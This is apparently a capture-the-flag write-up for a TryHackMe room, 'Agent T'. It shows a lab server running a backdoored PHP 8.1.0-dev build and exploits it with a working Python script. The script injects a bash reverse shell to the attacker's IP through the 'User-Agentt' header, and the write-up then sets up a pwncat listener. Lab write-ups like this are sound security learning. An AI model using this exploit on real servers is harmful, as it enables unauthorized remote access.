---
title: Agent T
tags:
- writeups
---


![[write-ups/images/Pasted image 20220807180318.png]]

So let's check the web server:

At this point I let `gobuster` run in the background, while I fired-up burp & started browsing around the website:
![[write-ups/images/Pasted image 20220807180601.png]]

Nothing too interesting. Besides this conversation
![[write-ups/images/Pasted image 20220807182331.png]]

After, poaching it for a little & hit some dead-ends, I went back to `nmap` & started [searching](https://letmegooglethat.com/?q=PHP+8.1.0-dev) for the php versions listed: `PHP cli server 5.5 or later (PHP 8.1.0-dev)`. I stumbled upon a [User-Agent RCE backdoor](https://github.com/flast101/php-8.1.0-dev-backdoor-rce). So we can just execute commands on the web server by suplying cmds through the `User-Agentt` header ! 
*([here](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a) is the commit that implements the backdoor, which was quickly [reverted](https://github.com/php/php-src/commit/8d743d5281c29e9750e183804b7ba02e1ff82f0b). Following to change the whole [commit workflow](https://news-web.php.net/php.internals/113838) of php's development)*

- craft a little python script to spawn a reverse shell for us
	```python
	import requests
	
	# Change ME
	target = "10.10.98.243"
	lhost  = "10.18.12.227"
	lport  = 9999
	
	
	# Craft the payload & send it
	URL = f"http://{target}/"
	payload = f'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'
	
	s = requests.Session()
	headers = {
	    "User-Agentt": f"zerodiumsystem('{payload}');"
	}
	print(headers)
	
	inject = s.get(URL, headers=headers, allow_redirects = False)
	```
- setup a listener *(I used [pwncat-cs](https://github.com/calebstewart/pwncat))*
	- ![[write-ups/images/Pasted image 20220809205127.png]]


## Refs
- https://flast101.github.io/php-8.1.0-dev-backdoor-rce/

## See Also
- [[write-ups/THM]]